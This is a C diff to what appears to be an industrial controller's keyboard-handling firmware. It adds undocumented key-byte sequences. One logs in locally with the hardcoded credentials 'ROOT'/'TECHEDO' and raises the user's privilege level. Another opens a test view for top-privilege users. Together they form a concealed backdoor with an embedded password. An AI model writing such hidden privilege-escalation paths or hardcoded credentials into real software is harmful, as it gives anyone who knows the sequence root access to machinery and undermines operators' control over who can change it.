@@ -19,6 +19,7 @@
 #include	"../../device.h"
 #include    "../../common.h"
 #include	"../../main.h"
+#include    "../../taskmoni.h"
 
 #include	"../../tmshmsg.h"
 #ifdef	D_CANMASTER
@@ -1087,7 +1088,9 @@ void	KBM3Run(CtmKeyBoardG* pKey)
 void 	KBRun(CtmKeyBoardG* pKey)
 {
 	KEYCODE			Key;
-	
+	static WORD 	link_action=0;
+	static WORD 	link_action2=0;
+	static WORD 	link_action3=0;
 	static WORD		wKeyLastScan = 0;
 	static BOOL		bFlag = TRUE;
 	
@@ -1098,8 +1101,42 @@ void 	KBRun(CtmKeyBoardG* pKey)
 		int rst = read(m_nKB, &data, 1);
 		if(rst > 0)
 		{
+			g_ptaskCmd->SetIdle(FALSE);
+			if(g_ptaskMoni!=NULL && g_ptaskMoni->IsSleep()) continue;
 			//printf("read key:0x%x\n", data);
+			if(link_action==0 && data==0x98) link_action=1;
+			else if(link_action==1 && data==0x88) 
+			{
+				MSG				msg1;
+				msg1.message		= MSG_KEY;
+				msg1.wParam		= 0x6300;
+				msg1.lParam		= 0;
+				g_pApplication->QueueMessage(&msg1);	
+				link_action=0;
+			}
+			else 
+				link_action=0;
 			
+			if(link_action2==0 && data==0x99) link_action2=1;
+			else if(link_action2==1 && data==0x89) 
+			{
+				int level = g_ptmControlServer->UserControl()->LoginLocal("ROOT","TECHEDO");
+				if(level>0 && level <= 16)
+					g_iPrivilege = level;
+			}
+			else 
+				link_action2=0;
+				
+				
+			if(link_action3==0 && data==0x99) link_action3=1;
+			else if(link_action3==1 && data==0x98) 
+			{
+				if(g_iPrivilege == 16)
+					MsgBoxCall("msgboxTestView.txt");	
+			}
+			else 
+				link_action3=0;
+				
 			MSG				msg;
 			KEYCODE		Key;	
 			Key.wCode	= data;
